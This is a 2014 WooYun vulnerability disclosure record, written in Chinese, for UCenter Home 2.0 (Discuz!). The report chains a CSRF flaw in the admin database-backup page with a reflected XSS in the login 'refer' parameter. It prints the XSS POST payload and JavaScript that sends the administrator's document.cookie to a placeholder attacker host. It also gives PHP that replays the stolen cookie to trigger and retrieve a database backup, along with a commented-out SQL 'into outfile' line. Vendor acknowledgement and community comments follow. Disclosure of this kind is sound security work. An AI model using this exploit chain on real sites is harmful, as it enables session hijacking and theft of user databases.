{"id": 2487, "wybug_id": "wooyun-2014-065383", "wybug_title": "ucenter_home_2.0_sc_utf8 xss脱库", "wybug_corp": "Discuz!", "wybug_author": "menmen519", "wybug_date": "2014-06-18 17:01", "wybug_open_date": "2014-08-02 17:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向公众公开  简要描述： ucenter_home_2.0_sc_utf8 xss拖库 刚才提交了一个纯csrf的漏洞，大家说是缺少备份路径信息，最后我给了猜想和结论，那么到这里我就利用这个xss+csrf来拖数据库 详细说明：  先黏贴上上次的漏洞概要(只是为了证实存在csrf)：---------------------------------------------------------------------------登陆管理员后台，经过所有的测试，发现在备份数据库这里存在对referer不做校验，如图所示： \n\n 然后我们在分析如下： \n\n 接下来我们就要证明的是，此请求是否与referer有关系，证明如下： 第一，我们抓取原始包，如图： \n\n 第二，我们删除referer，如图： \n\n 第三，我们篡改referer，如图： \n\n 发现三种请求结果都是正确的，由此我们判断这里存在csrf，但是接下来要怎么利用呢 我们然后去普通用户的页面寻找机会，发现普通的界面有一个链接分享，如图所示： 第一步，我们构造一个html页面，里面的就是要发送请求的表单，然后分享此链接，如图所示： \n\n 第二步，我们试着在管理员页面查找一下，该链接怎么样，有时候我们会美化此url，并且做一些诱人的操作，那么管理员就会看到，并且很大机会点击，在这里我们可以发送好多这种请求，让此链接置顶，只要他手贱，就能搞定，看看管理员的页面，如图： \n\n 第三步，我们以管理员的身份点击一下此链接，漂亮的执行了，如图所示： \n\n 第四部，我们访问刚才看到的那个地址，这里我们以非管理员，或者非用户的身份访问，如图所示： \n\n 到此为止我们的测试算是完毕了，那么我们进一步分析一下： 分析一，如果我们在我们的服务器端，写一个监听此文件的操作，在第一时间内读取sql语句，就是管理员发现了，他也来不及删除 分析二，我们在如果我们要有一个反射性xss，或者一个存储型xss，那么我们可能就不用这么麻烦了，可以悄无声息的执行完毕我们所有的操作 哈哈，一不小心之间，我发现了他的一个反射性xss： 在我们注册的时候提交的一个参数refer存在问题，整个发送过程如下： \n\n 这样一来我们可以同样构造分享页面，把这个反射性变成一个持久性的，然后当管理员点击之后，我们还可以操作js还原线程，也可以把获取的成功消息和内容主动发送到我们的远端服务器上面，这样岂不是更美 ok！！！！！！！ ------------------------------------------------------------------------------下来我们来进一步渗透（采用反射型xss，反弹cookie到客户端，然后发包拿库）第一步，我们申请一个正确的用户名密码，让服务器端验证通过，然后我们重放此请求确认存在xss的图，如下：\n\npost_data:username=test&password=111111&refer=space.php%253Fdo%253Dhome%22%20onmouseover%3d\"\"><script src=http://xxx.js></script>&loginsubmit=%E7%99%BB%E5%BD%95&formhash=39dc0370发送请求的url：http://10.65.10.199:8089/UCenter_Home_2.0_SC_UTF8/upload/do.php?ac=2de6b2eee024131aae896b3060b02b89&&ref这里我们写一下请求的js内容为：\nfunction ajax(){      var request = false;      if(window.XMLHttpRequest) {          request = new XMLHttpRequest();      } else if(window.ActiveXObject) {          var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];          for(var i=0; i<versions.length; i++) {              try {                  request = new ActiveXObject(versions[i]);              } catch(e) {}          }      }      return request;  }var _x = ajax();  postgo();function postgo() {    var src=\"http://www.xxx.get_c.php?cookie=\"+document.cookie;    xhr_act(\"GET\",src);}  function xhr_act(_m,_s){    _x.open(_m,_s,false);    _x.send(_a);    return _x.responseText;  }\n然后我们编写远程服务器端的php代码：\n<?phpfunction http_post($server,$host,$port,$url,$params,$timeout,$cookie){    $result=\"\";    //创建socket连接    $fp = fsockopen($server,$port,$errno,$errstr,$timeout);    if (!$fp)    {        $result = $errstr.\"--->\".$errno;        return $result;    }    $length = strlen($params);    //构造post请求的头    $header = \"GET \".$url.\" HTTP/1.1\\r\\n\";    $header .= \"Host:\".$host.\"\\r\\n\";    $header .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";    $header .= \"Content-Length: \".$length.\"\\r\\n\";\t$header .= \"Cookie: \".$cookie.\"\\r\\n\";    $header .= \"Connection: Close\\r\\n\\r\\n\";    //添加post的字符串    //$header .= $params.\"\\r\\n\";    //发送post的数据    fputs($fp,$header);    $inheader = 1;    while (!feof($fp))    {        $line = fgets($fp,1024); //去除请求包的头只显示页面的返回数据        echo $line;        if ($inheader && ($line == \"\\n\" || $line == \"\\r\\n\"))        {            $inheader = 0;        }        if ($inheader == 0)        {            $result .= $line;        }    }    fclose($fp);    return $result;}$cookie=$_GET['cookie'];$server='10.65.10.199';$host='10.65.10.199:8089';$path=\"/ucenter_home_2.0_sc_utf8/upload/admincp.php?ac=backup\";$url=\"http://\".$host.$path;//$params=\"sql=select+%27%3C%3Fphp+phpinfo()+%3F%3E%27+into+outfile+%27D%3A%2Fwamp%2Fwww%2FECShop_V2.7.3_GBK_release1106%2Fupload%2Fdata%2Ffeedbackimg%2Ftest.php%27&act=query\";$content = http_post($server,$host,8089,$url,$params,10,$cookie);$pattern = \"/服务器备份文件名/\"?>\n然后我们看看执行后台的截图，并且完全能看到所有的，路径信息：\n\n\n\n到此为止不用我多说了吧，远端js的怎样加载，让管理员怎么触发，在最上面已经很明确了乌云大神，刚才漏洞的分析，我底下附上了猜想，还有xss证实，哎！！！这次不能不给过吧   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-18 17:44 厂商回复： 感谢您提供的信息，我们会尽快处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-18 17:03 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  你赢了    \n     2014-06-18 17:04 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  感谢洞主，秒秒钟删掉备份代码，discuz什么时候CSRF修干净？    \n     2014-06-18 17:06 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @xsser 一个很纠结的漏洞    \n     2014-06-18 17:11 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  搞了52?    \n     2014-06-18 17:11 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  2L明显是受伤群体之一    \n     2014-06-18 17:16 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @zeracker 你们核心白帽子 试试也审核漏洞呢？    \n     2014-06-18 17:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @menmen519 担心有风险    \n     2014-06-18 17:56 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  看来dz还是怕\"脱裤\"这词..    \n     2014-06-18 18:14 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  有getshell你信不    \n     2014-07-09 13:52 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  87    \n     2014-07-20 17:10 |    \t\t犯罪嫌疑猪 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 也暂无)\t\t \n  我还没有帽子    \n     2014-08-02 18:02 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:34        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n   我表示我就没看懂，看来基础决定一切    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}